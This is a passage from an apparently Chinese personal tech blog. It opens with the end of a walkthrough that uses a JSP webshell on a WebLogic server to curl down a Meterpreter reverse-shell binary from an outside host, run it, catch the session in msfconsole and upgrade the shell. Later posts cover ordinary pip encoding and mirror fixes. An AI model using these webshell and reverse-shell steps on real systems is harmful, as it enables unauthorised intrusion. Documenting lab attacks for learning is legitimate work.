<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">3</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">orchestration</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">2</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">26</span> <span class="mi">01</span><span class="p">:</span><span class="mi">39</span> <span class="nx">original</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">2</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">security</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">3</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">servers</span>
<span class="o">-</span><span class="nx">rwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">1</span> <span class="nx">oracle</span> <span class="nx">oracle</span>     <span class="mi">261</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">00</span><span class="p">:</span><span class="mi">23</span> <span class="nx">startWebLogic</span><span class="p">.</span><span class="nx">sh</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span>  <span class="mi">3</span> <span class="nx">oracle</span> <span class="nx">oracle</span>    <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">25</span> <span class="mi">09</span><span class="p">:</span><span class="mi">49</span> <span class="nx">tmp</span>
</code></pre></div></div>

<h4 id="下载shell文件执行">下载shell文件执行</h4>
<p>在一句话木马上执行下载命令，<code class="language-plaintext highlighter-rouge">Wget</code>和<code class="language-plaintext highlighter-rouge">Curl</code>都可以，一般linux机器上都自带下载工具</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=curl -o shell.elf http://ip/shell.elf
等待下载完毕；继续赋权
chmod 777 shell.elf
在查看一下：
total 1100
drwxr-x--- 15 oracle oracle    4096 Apr 27 08:06 .
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 ..
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 autodeploy
drwxr-x---  6 oracle oracle    4096 Apr 25 00:23 bin
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 common
drwxr-x---  9 oracle oracle    4096 Apr 25 00:24 config
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 console-ext
-rw-r-----  1 oracle oracle     234 Apr 25 00:23 derby.log
-rw-r-----  1 oracle oracle     257 Apr 25 00:24 edit.lok
-rw-r-----  1 oracle oracle     327 Jul 19  2017 fileRealm.properties
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 init-info
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 lib
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 nodemanager
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 orchestration
drwxr-x---  2 oracle oracle    4096 Apr 26 01:39 original
drwxr-x---  2 oracle oracle    4096 Apr 25 00:23 security
drwxr-x---  3 oracle oracle    4096 Apr 25 00:23 servers
-rwxrwxrwx  1 oracle oracle 1046632 Apr 27 08:06 shell.elf
-rwxr-x---  1 oracle oracle     261 Apr 25 00:23 startWebLogic.sh
drwxr-x---  3 oracle oracle    4096 Apr 25 09:49 tmp
</code></pre></div></div>

<h4 id="shell流量接入">shell流量接入</h4>
<p>我们发现已经成功下载了反弹shell的msf文件，直接执行
<code class="language-plaintext highlighter-rouge">http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=./shell.elf</code>，执行前别忘了在服务器上监听端口。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="nx">msfconsole</span>
<span class="nx">msf5</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span>
<span class="nx">msf5</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">PAYLOAD</span> <span class="nx">linux</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">meterpreter_reverse_tcp</span>
<span class="nx">PAYLOAD</span> <span class="o">=&gt;</span> <span class="nx">linux</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">meterpreter_reverse_tcp</span>
<span class="nx">msf5</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span>
<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span>
<span class="nx">msf5</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">1234</span>
<span class="nx">LPORT</span> <span class="o">=&gt;</span> <span class="mi">1234</span>
<span class="nx">msf5</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">1234</span>

</code></pre></div></div>
<p>执行完就可以看到建立连接的流量接入了：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Meterpreter</span> <span class="nx">session</span> <span class="mi">1</span> <span class="nx">opened</span> <span class="p">(</span><span class="mf">172.31</span><span class="p">.</span><span class="mf">116.237</span><span class="p">:</span><span class="mi">1234</span> <span class="o">-&gt;</span> <span class="mf">59.110</span><span class="p">.</span><span class="mf">152.168</span><span class="p">:</span><span class="mi">44832</span><span class="p">)</span> <span class="nx">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">27</span> <span class="mi">16</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">48</span> <span class="o">+</span><span class="mi">0800</span>
</code></pre></div></div>
<p>下一步：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">shell</span>
<span class="nx">Process</span> <span class="mi">460</span> <span class="nx">created</span><span class="p">.</span>
<span class="nx">Channel</span> <span class="mi">1</span> <span class="nx">created</span><span class="p">.</span>
<span class="nx">whoami</span>
<span class="nx">oracle</span>
<span class="nx">python</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">import pty;pty.spawn("/bin/sh")</span><span class="dl">'</span>
<span class="nx">sh</span><span class="o">-</span><span class="mf">4.2</span><span class="nx">$</span> <span class="nx">whoami</span>
<span class="nx">whoami</span>
<span class="nx">oracle</span>
<span class="nx">sh</span><span class="o">-</span><span class="mf">4.2</span><span class="nx">$</span> <span class="nx">sudo</span> <span class="nx">su</span>
<span class="nx">sudo</span> <span class="nx">su</span>
<span class="nx">sh</span><span class="p">:</span> <span class="nx">sudo</span><span class="p">:</span> <span class="nx">command</span> <span class="nx">not</span> <span class="nx">found</span>
<span class="nx">python</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">import pty;pty.spawn("/bin/bash")</span><span class="dl">'</span>
<span class="p">[</span><span class="nx">oracle</span><span class="p">@</span><span class="nd">5c6fe690ac22</span> <span class="nx">base_domain</span><span class="p">]</span><span class="nx">$</span> <span class="nx">pwd</span>
<span class="nx">pwd</span>
<span class="o">/</span><span class="nx">u01</span><span class="o">/</span><span class="nx">oracle</span><span class="o">/</span><span class="nx">user_projects</span><span class="o">/</span><span class="nx">domains</span><span class="o">/</span><span class="nx">base_domain</span>
<span class="p">[</span><span class="nx">oracle</span><span class="p">@</span><span class="nd">5c6fe690ac22</span> <span class="nx">base_domain</span><span class="p">]</span><span class="nx">$</span> <span class="nx">ls</span>
<span class="nx">ls</span>
<span class="nx">autodeploy</span>  <span class="nx">console</span><span class="o">-</span><span class="nx">ext</span>           <span class="nx">init</span><span class="o">-</span><span class="nx">info</span>      <span class="nx">original</span>   <span class="nx">startWebLogic</span><span class="p">.</span><span class="nx">sh</span>
<span class="nx">bin</span>         <span class="nx">derby</span><span class="p">.</span><span class="nx">log</span>             <span class="nx">lib</span>            <span class="nx">security</span>   <span class="nx">tmp</span>
<span class="nx">common</span>      <span class="nx">edit</span><span class="p">.</span><span class="nx">lok</span>              <span class="nx">nodemanager</span>    <span class="nx">servers</span>
<span class="nx">config</span>      <span class="nx">fileRealm</span><span class="p">.</span><span class="nx">properties</span>  <span class="nx">orchestration</span>  <span class="nx">shell</span><span class="p">.</span><span class="nx">elf</span>
<span class="p">[</span><span class="nx">oracle</span><span class="p">@</span><span class="nd">5c6fe690ac22</span> <span class="nx">base_domain</span><span class="p">]</span><span class="nx">$</span> <span class="nx">uname</span> <span class="o">-</span><span class="nx">a</span>
<span class="nx">uname</span> <span class="o">-</span><span class="nx">a</span>
<span class="nx">Linux</span> <span class="mi">5</span><span class="nx">c6fe690ac22</span> <span class="mf">3.10</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="mf">1062.12</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">el7</span><span class="p">.</span><span class="nx">x86_64</span> <span class="err">##</span><span class="mi">1</span> <span class="nx">SMP</span> <span class="nx">Tue</span> <span class="nx">Feb</span> <span class="mi">4</span> <span class="mi">23</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">59</span> <span class="nx">UTC</span> <span class="mi">2020</span> <span class="nx">x86_64</span> <span class="nx">x86_64</span> <span class="nx">x86_64</span> <span class="nx">GNU</span><span class="o">/</span><span class="nx">Linux</span>
</code></pre></div></div>
<p>以上。</p>

          <p><a href="/blog/2020/docker/reverse/shell/by1/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/pip/said/unkown/encoding/"><h3 class="ctitle">「Terminal」:pip报错'unkown-encoding'</h3></a>
          <p><csmall>Apr 1, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>可怖的unkown encoding.</li>
</ul>

<p>自从修改了windows终端的编码格式后，就出了各种问题，几乎在终端上执行的软件都运行不了，提示<code class="language-plaintext highlighter-rouge">LookupError: unknown encoding: cp65001</code>，如下报错。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">本阿信</span><span class="o">&gt;</span><span class="nx">pip</span> <span class="o">--</span><span class="nx">version</span>
<span class="nx">Traceback</span> <span class="p">(</span><span class="nx">most</span> <span class="nx">recent</span> <span class="nx">call</span> <span class="nx">last</span><span class="p">):</span>
  <span class="nx">File</span> <span class="dl">"</span><span class="s2">c:</span><span class="se">\</span><span class="s2">python27</span><span class="se">\</span><span class="s2">lib</span><span class="se">\r</span><span class="s2">unpy.py</span><span class="dl">"</span><span class="p">,</span> <span class="nx">line</span> <span class="mi">174</span><span class="p">,</span> <span class="k">in</span> <span class="nx">_run_module_as_main</span>
    <span class="dl">"</span><span class="s2">__main__</span><span class="dl">"</span><span class="p">,</span> <span class="nx">fname</span><span class="p">,</span> <span class="nx">loader</span><span class="p">,</span> <span class="nx">pkg_name</span><span class="p">)</span>
  <span class="nx">File</span> <span class="dl">"</span><span class="s2">c:</span><span class="se">\</span><span class="s2">python27</span><span class="se">\</span><span class="s2">lib</span><span class="se">\r</span><span class="s2">unpy.py</span><span class="dl">"</span><span class="p">,</span> <span class="nx">line</span> <span class="mi">72</span><span class="p">,</span> <span class="k">in</span> <span class="nx">_run_code</span>
    <span class="nx">exec</span> <span class="nx">code</span> <span class="k">in</span> <span class="nx">run_globals</span>
  <span class="nx">File</span> <span class="dl">"</span><span class="s2">C:</span><span class="se">\</span><span class="s2">Python27</span><span class="se">\</span><span class="s2">Scripts</span><span class="se">\</span><span class="s2">pip.exe</span><span class="se">\</span><span class="s2">__main__.py</span><span class="dl">"</span><span class="p">,</span> <span class="nx">line</span> <span class="mi">4</span><span class="p">,</span> <span class="k">in</span> <span class="o">&lt;</span><span class="nx">module</span><span class="o">&gt;</span>
  <span class="nx">File</span> <span class="dl">"</span><span class="s2">c:</span><span class="se">\</span><span class="s2">python27</span><span class="se">\</span><span class="s2">lib</span><span class="se">\</span><span class="s2">site-packages</span><span class="se">\</span><span class="s2">pip</span><span class="se">\</span><span class="s2">_internal</span><span class="se">\</span><span class="s2">cli</span><span class="se">\</span><span class="s2">main.py</span><span class="dl">"</span><span class="p">,</span> <span class="nx">line</span> <span class="mi">10</span><span class="p">,</span> <span class="k">in</span> <span class="o">&lt;</span><span class="nx">module</span><span class="o">&gt;</span>
    <span class="k">from</span> <span class="nx">pip</span><span class="p">.</span><span class="nx">_internal</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">autocompletion</span> <span class="k">import</span> <span class="nx">autocomplete</span>
  <span class="nx">File</span> <span class="dl">"</span><span class="s2">c:</span><span class="se">\</span><span class="s2">python27</span><span class="se">\</span><span class="s2">lib</span><span class="se">\</span><span class="s2">site-packages</span><span class="se">\</span><span class="s2">pip</span><span class="se">\</span><span class="s2">_internal</span><span class="se">\</span><span class="s2">cli</span><span class="se">\</span><span class="s2">autocompletion.py</span><span class="dl">"</span><span class="p">,</span> <span class="nx">line</span> <span class="mi">9</span><span class="p">,</span> <span class="k">in</span> <span class="o">&lt;</span><span class="nx">module</span><span class="o">&gt;</span>
    <span class="k">from</span> <span class="nx">pip</span><span class="p">.</span><span class="nx">_internal</span><span class="p">.</span><span class="nx">cli</span><span class="p">.</span><span class="nx">main_parser</span> <span class="k">import</span> <span class="nx">create_main_parser</span>
  <span class="nx">File</span> <span class="dl">"</span><span class="s2">c:</span><span class="se">\</span><span class="s2">python27</span><span class="se">\</span><span class="s2">lib</span><span class="se">\</span><span class="s2">site-packages</span><span class="se">\</span><span class="s2">pip</span><span class="se">\</span><span class="s2">_internal</span><span class="se">\</span><span class="s2">cli</span><span class="se">\</span><span class="s2">main_parser.py</span><span class="dl">"</span><span class="p">,</span> <span class="nx">line</span> <span class="mi">7</span><span class="p">,</span> <span class="k">in</span> <span class="o">&lt;</span><span class="nx">module</span><span class="o">&gt;</span>
    <span class="k">from</span> <span class="nx">pip</span><span class="p">.</span><span class="nx">_internal</span><span class="p">.</span><span class="nx">cli</span> <span class="k">import</span> <span class="nx">cmdoptions</span>
  <span class="nx">File</span> <span class="dl">"</span><span class="s2">c:</span><span class="se">\</span><span class="s2">python27</span><span class="se">\</span><span class="s2">lib</span><span class="se">\</span><span class="s2">site-packages</span><span class="se">\</span><span class="s2">pip</span><span class="se">\</span><span class="s2">_internal</span><span class="se">\</span><span class="s2">cli</span><span class="se">\</span><span class="s2">cmdoptions.py</span><span class="dl">"</span><span class="p">,</span> <span class="nx">line</span> <span class="mi">31</span><span class="p">,</span> <span class="k">in</span> <span class="o">&lt;</span><span class="nx">module</span><span class="o">&gt;</span>
    <span class="k">from</span> <span class="nx">pip</span><span class="p">.</span><span class="nx">_internal</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">ui</span> <span class="k">import</span> <span class="nx">BAR_TYPES</span>
  <span class="nx">File</span> <span class="dl">"</span><span class="s2">c:</span><span class="se">\</span><span class="s2">python27</span><span class="se">\</span><span class="s2">lib</span><span class="se">\</span><span class="s2">site-packages</span><span class="se">\</span><span class="s2">pip</span><span class="se">\</span><span class="s2">_internal</span><span class="se">\</span><span class="s2">utils</span><span class="se">\</span><span class="s2">ui.py</span><span class="dl">"</span><span class="p">,</span> <span class="nx">line</span> <span class="mi">64</span><span class="p">,</span> <span class="k">in</span> <span class="o">&lt;</span><span class="nx">module</span><span class="o">&gt;</span>
    <span class="nx">_BaseBar</span> <span class="o">=</span> <span class="nx">_select_progress_class</span><span class="p">(</span><span class="nx">IncrementalBar</span><span class="p">,</span> <span class="nx">Bar</span><span class="p">)</span>  <span class="err">#</span> <span class="nx">type</span><span class="p">:</span> <span class="nx">Any</span>
  <span class="nx">File</span> <span class="dl">"</span><span class="s2">c:</span><span class="se">\</span><span class="s2">python27</span><span class="se">\</span><span class="s2">lib</span><span class="se">\</span><span class="s2">site-packages</span><span class="se">\</span><span class="s2">pip</span><span class="se">\</span><span class="s2">_internal</span><span class="se">\</span><span class="s2">utils</span><span class="se">\</span><span class="s2">ui.py</span><span class="dl">"</span><span class="p">,</span> <span class="nx">line</span> <span class="mi">57</span><span class="p">,</span> <span class="k">in</span> <span class="nx">_select_progress_class</span>
    <span class="nx">six</span><span class="p">.</span><span class="nx">text_type</span><span class="p">().</span><span class="nx">join</span><span class="p">(</span><span class="nx">characters</span><span class="p">).</span><span class="nx">encode</span><span class="p">(</span><span class="nx">encoding</span><span class="p">)</span>
<span class="nx">LookupError</span><span class="p">:</span> <span class="nx">unknown</span> <span class="nx">encoding</span><span class="p">:</span> <span class="nx">cp65001</span>
</code></pre></div></div>

<p>只能怪自己，好好的改什么txt文本编码，现在好了。<a href="https://stackoverflow.com/questions/35176270/python-2-7-lookuperror-unknown-encoding-cp65001">解铃还须系铃人：</a>暂时在该终端下可以使用pip</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">本阿信</span><span class="o">&gt;</span><span class="kd">set</span> <span class="nx">PYTHONIOENCODING</span><span class="o">=</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span>

<span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">本阿信</span><span class="o">&gt;</span><span class="nx">pip</span> <span class="o">--</span><span class="nx">version</span>
<span class="nx">pip</span> <span class="mf">20.0</span><span class="p">.</span><span class="mi">2</span> <span class="k">from</span> <span class="nx">c</span><span class="p">:</span><span class="err">\</span><span class="nx">python27</span><span class="err">\</span><span class="nx">lib</span><span class="err">\</span><span class="nx">site</span><span class="o">-</span><span class="nx">packages</span><span class="err">\</span><span class="nx">pip</span> <span class="p">(</span><span class="nx">python</span> <span class="mf">2.7</span><span class="p">)</span>
</code></pre></div></div>
<p>链接还建议设置全局变量为<code class="language-plaintext highlighter-rouge">$env:PYTHONIOENCODING = "UTF-8"</code>，但是我搜索了一下，没有找到方法，希望会的朋友邮件我教我。
<code class="language-plaintext highlighter-rouge">CHCP 936</code></p>

<hr />

<p>UTF-8是unicode编码的一种落地方案：</p>

<p>Unicode符号范围 | UTF-8编码方式
(十六进制) | （二进制）
——————–+———————————————
0000 0000-0000 007F | 0xxxxxxx
0000 0080-0000 07FF | 110xxxxx 10xxxxxx
0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx
0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</p>

<p>\x对应的是UTF-8编码的数据，通过转化规则可以转换为Unicode编码，就能得到对应的汉字，转换规则很简单，先将\x去掉，转换为数字，然后进行对应的位移操作即可，需要注意的是先要判断utf-8的位数.</p>
<blockquote>
  <p>联系我:chihou.pro@gmail.com ^_^谢谢</p>
</blockquote>

          <p><a href="/blog/2020/pip/said/unkown/encoding/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/sk_learn/record/"><h3 class="ctitle">「机器学习」:sklearn-学习记录-pip</h3></a>
          <p><csmall>Feb 21, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h2 id="pip的环境问题">pip的环境问题</h2>

<h2 id="pip-timeout">pip-timeout</h2>

<p>安装scikit-learn依赖包，安装时一直报错time out超时，所以加上了<code class="language-plaintext highlighter-rouge">default-timeout</code>参数：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pip3</span> <span class="o">--</span><span class="k">default</span><span class="o">-</span><span class="nx">timeout</span><span class="o">=</span><span class="mi">1000</span> <span class="nx">install</span> <span class="o">-</span><span class="nx">U</span> <span class="nx">scikit</span><span class="o">-</span><span class="nx">learn</span>
 <span class="nx">Downloading</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//pypi.tuna.tsinghua.edu.cn/packages/73/db/7d8204ddba84ab5d1e4fd1af8f82bbe39c589488bee71e45c662f4144010/scikit_learn-0.22.1-cp37-cp37m-manylinux1_x86_64.whl (7.0MB)</span>
    <span class="mi">100</span><span class="o">%</span> <span class="o">|</span><span class="err">████████████████████████████████</span><span class="o">|</span> <span class="mf">7.0</span><span class="nx">MB</span> <span class="mi">159</span><span class="nx">kB</span><span class="o">/</span><span class="nx">s</span> 
<span class="nx">Successfully</span> <span class="nx">installed</span> <span class="nx">scikit</span><span class="o">-</span><span class="nx">learn</span><span class="o">-</span><span class="mf">0.22</span><span class="p">.</span><span class="mi">1</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pip3</span> <span class="o">--</span><span class="k">default</span><span class="o">-</span><span class="nx">timeout</span><span class="o">=</span><span class="mi">1000</span> <span class="nx">install</span> <span class="o">-</span><span class="nx">U</span> <span class="nx">SciPy</span>
<span class="nx">Downloading</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//pypi.tuna.tsinghua.edu.cn/packages/dd/82/c1fe128f3526b128cfd185580ba40d01371c5d299fcf7f77968e22dfcc2e/scipy-1.4.1-cp37-cp37m-manylinux1_x86_64.whl (26.1MB)</span>
    <span class="mi">100</span><span class="o">%</span> <span class="o">|</span><span class="err">████████████████████████████████</span><span class="o">|</span> <span class="mf">26.1</span><span class="nx">MB</span> <span class="mi">44</span><span class="nx">kB</span><span class="o">/</span><span class="nx">s</span> 
<span class="nx">Successfully</span> <span class="nx">installed</span> <span class="nx">SciPy</span><span class="o">-</span><span class="mf">1.4</span><span class="p">.</span><span class="mi">1</span>
</code></pre></div></div>

<h2 id="国内换源">国内换源</h2>
<p>或者还有一种可能是因为pip找的库在国外的库，会导致下载速度过慢。这种情况可以直接换成国内的源</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">vi</span> <span class="o">~</span><span class="sr">/.pip/</span><span class="nx">pip</span><span class="p">.</span><span class="nx">conf</span>
<span class="nx">把下面内容放进去</span>
<span class="p">[</span><span class="nb">global</span><span class="p">]</span>
<span class="nx">timeout</span> <span class="o">=</span> <span class="mi">6000</span>
<span class="nx">index</span><span class="o">-</span><span class="nx">url</span> <span class="o">=</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//pypi.tuna.tsinghua.edu.cn/simple/</span>
<span class="o">*******</span>
<span class="o">**</span><span class="nx">pip国内的一些镜像</span><span class="err">：</span>
<span class="o">*******</span>
<span class="err">  </span><span class="nx">阿里云</span><span class="err"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//mirrors.aliyun.com/pypi/simple/ </span>
<span class="err">  </span><span class="nx">中国科技大学</span><span class="err"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//pypi.mirrors.ustc.edu.cn/simple/ </span>
<span class="err">  </span><span class="nx">豆瓣</span><span class="p">(</span><span class="nx">douban</span><span class="p">)</span><span class="err"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//pypi.douban.com/simple/ </span>
<span class="err">  </span><span class="nx">清华大学</span><span class="err"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//pypi.tuna.tsinghua.edu.cn/simple/ </span>
<span class="err">  </span><span class="nx">中国科学技术大学</span><span class="err"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//pypi.mirrors.ustc.edu.cn/simple/</span>
</code></pre></div></div>

<p>windows下：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">进入C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">用户名</span><span class="err">\</span><span class="nx">pip</span><span class="err">，</span><span class="nx">在pip目录下新建文件</span><span class="err">（</span><span class="nx">没有新建文件夹</span><span class="err">）</span>
<span class="nx">pip</span><span class="p">.</span><span class="nx">ini</span>
<span class="nx">同样输入上面的内容即可</span><span class="err">。</span>
</code></pre></div></div>
<h2 id="测试">测试</h2>
<p>可以看到，下载依赖已经在我们指定的pip库里索引了。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="nx">pip</span> <span class="nx">install</span> <span class="nx">pandas</span>
<span class="nx">DEPRECATION</span><span class="p">:</span> <span class="nx">Python</span> <span class="mf">2.7</span> <span class="nx">reached</span> <span class="nx">the</span> <span class="nx">end</span> <span class="k">of</span> <span class="nx">its</span> <span class="nx">life</span> <span class="nx">on</span> <span class="nx">January</span> <span class="mi">1</span><span class="nx">st</span><span class="p">,</span> <span class="mi">2020</span><span class="p">.</span> <span class="nx">Please</span> <span class="nx">upgrade</span> <span class="nx">your</span> <span class="nx">Python</span> <span class="k">as</span> <span class="nx">Python</span> <span class="mf">2.7</span> <span class="nx">is</span> <span class="nx">no</span> <span class="nx">longer</span> <span class="nx">maintained</span><span class="p">.</span> <span class="nx">A</span> <span class="nx">future</span> <span class="nx">version</span> <span class="k">of</span> <span class="nx">pip</span> <span class="nx">will</span> <span class="nx">drop</span> <span class="nx">support</span> <span class="k">for</span> <span class="nx">Python</span> <span class="mf">2.7</span><span class="p">.</span> <span class="nx">More</span> <span class="nx">details</span> <span class="nx">about</span> <span class="nx">Python</span> <span class="mi">2</span> <span class="nx">support</span> <span class="k">in</span> <span class="nx">pip</span><span class="p">,</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">found</span> <span class="nx">at</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//pip.pypa.io/en/latest/development/release-process/#python-2-support</span>
<span class="nx">Looking</span> <span class="k">in</span> <span class="nx">indexes</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//pypi.tuna.tsinghua.edu.cn/simple</span>
<span class="nx">Requirement</span> <span class="nx">already</span> <span class="nx">satisfied</span><span class="p">:</span> <span class="nx">pandas</span> <span class="k">in</span> <span class="sr">/usr/</span><span class="nx">local</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">python2</span><span class="p">.</span><span class="mi">7</span><span class="o">/</span><span class="nx">dist</span><span class="o">-</span><span class="nx">packages</span> <span class="p">(</span><span class="mf">0.24</span><span class="p">.</span><span class="mi">2</span><span class="p">)</span>
<span class="nx">Requirement</span> <span class="nx">already</span> <span class="nx">satisfied</span><span class="p">:</span> <span class="nx">pytz</span><span class="o">&gt;=</span><span class="mi">2011</span><span class="nx">k</span> <span class="k">in</span> <span class="sr">/usr/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">python2</span><span class="p">.</span><span class="mi">7</span><span class="o">/</span><span class="nx">dist</span><span class="o">-</span><span class="nx">packages</span> <span class="p">(</span><span class="k">from</span> <span class="nx">pandas</span><span class="p">)</span> <span class="p">(</span><span class="mf">2019.3</span><span class="p">)</span>
<span class="nx">Requirement</span> <span class="nx">already</span> <span class="nx">satisfied</span><span class="p">:</span> <span class="nx">numpy</span><span class="o">&gt;=</span><span class="mf">1.12</span><span class="p">.</span><span class="mi">0</span> <span class="k">in</span> <span class="sr">/usr/</span><span class="nx">local</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">python2</span><span class="p">.</span><span class="mi">7</span><span class="o">/</span><span class="nx">dist</span><span class="o">-</span><span class="nx">packages</span> <span class="p">(</span><span class="k">from</span> <span class="nx">pandas</span><span class="p">)</span> <span class="p">(</span><span class="mf">1.16</span><span class="p">.</span><span class="mi">6</span><span class="p">)</span>
<span class="nx">Requirement</span> <span class="nx">already</span> <span class="nx">satisfied</span><span class="p">:</span> <span class="nx">python</span><span class="o">-</span><span class="nx">dateutil</span><span class="o">&gt;=</span><span class="mf">2.5</span><span class="p">.</span><span class="mi">0</span> <span class="k">in</span> <span class="sr">/usr/</span><span class="nx">local</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">python2</span><span class="p">.</span><span class="mi">7</span><span class="o">/</span><span class="nx">dist</span><span class="o">-</span><span class="nx">packages</span> <span class="p">(</span><span class="k">from</span> <span class="nx">pandas</span><span class="p">)</span> <span class="p">(</span><span class="mf">2.8</span><span class="p">.</span><span class="mi">1</span><span class="p">)</span>
